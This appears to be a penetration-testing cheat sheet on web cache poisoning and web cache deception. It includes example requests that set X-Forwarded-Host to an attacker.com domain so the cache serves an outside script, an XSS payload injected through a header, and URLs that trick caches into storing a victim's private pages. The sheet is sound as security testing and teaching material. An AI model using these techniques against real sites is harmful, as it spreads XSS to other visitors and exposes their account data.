# Cache Poisoning

## Overview
Web cache poisoning uses unkeyed inputs to store malicious responses in shared caches, serving them to other users.

## Core Concept
```
Cache key = typically: Host + Path + Query string
Unkeyed inputs = headers/params that affect response but NOT the cache key
→ Poison cache with malicious unkeyed input → served to all users requesting same key
```

## Finding Unkeyed Inputs
```
# Use Param Miner (Burp extension) to discover unkeyed headers/params
# Common unkeyed headers:
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-For
X-Host
X-Original-URL
X-Rewrite-URL
X-Original-Forwarded-For
Forwarded
```

## Cache Poisoning via X-Forwarded-Host
```
# If server uses X-Forwarded-Host for generating URLs in response
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response contains:
<script src="https://attacker.com/static/app.js">
# → Cache this response → serve XSS to all visitors
```

## Cache Poisoning for XSS
```
# Find unkeyed input that is reflected in response
GET /search?q=hello HTTP/1.1
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# If reflected without encoding in cached response
# All users hitting /search?q=hello get XSS
```

## Cache Poisoning via HTTP Request Smuggling
```
# Smuggle a request that poisons cache for next user
# POST with CL.TE/TE.CL to inject crafted request
# See http_request_smuggling.md
```

## Cache Key Confusion
```
# Some caches ignore port, some don't
GET /page HTTP/1.1
Host: target.com:1337  # different cache key, same backend response

# Fat GET requests
GET /page?param=evil HTTP/1.1
# If param is unkeyed but reflected

# Cache parameter cloaking
GET /page?utm_content=1&param=evil  # utm_content is keyed, param is unkeyed but breaks cache key
```

## Web Cache Deception
```
# Different attack: trick user into caching their private data
# App serves authenticated page for unknown extensions

# Trick victim into visiting:
https://target.com/my-account/cache.css
https://target.com/dashboard.jpg

# If server responds with authenticated content
# Cache stores it → attacker requests same URL → gets victim's data

# Works when:
1. Cache caches static-extension paths
2. Server ignores path suffix and returns dynamic content
3. Cache doesn't validate response is static
```

## Testing Methodology
1. Identify caching behavior: check Age, X-Cache, CF-Cache-Status headers
2. Use Param Miner to find unkeyed headers
3. Test each unkeyed header for reflection in response
4. Test reflection for XSS/redirection injection
5. Poison cache: send malicious request, observe cache status
6. Request from clean browser/IP to confirm poison worked
7. Test web cache deception: add .css/.jpg suffix to authenticated pages

## Cache Identification
```
# Cache hit indicators:
X-Cache: HIT
CF-Cache-Status: HIT
Age: <non-zero>
X-Varnish: <two IDs>

# Force cache miss (to test fresh):
Cache-Control: no-cache
Pragma: no-cache
# Or add cache-busting param: ?cb=12345
```

## Tools
- Burp Param Miner — unkeyed input discovery
- `Web Cache Vulnerability Scanner` (WCVS)
- Manual testing with cache busters
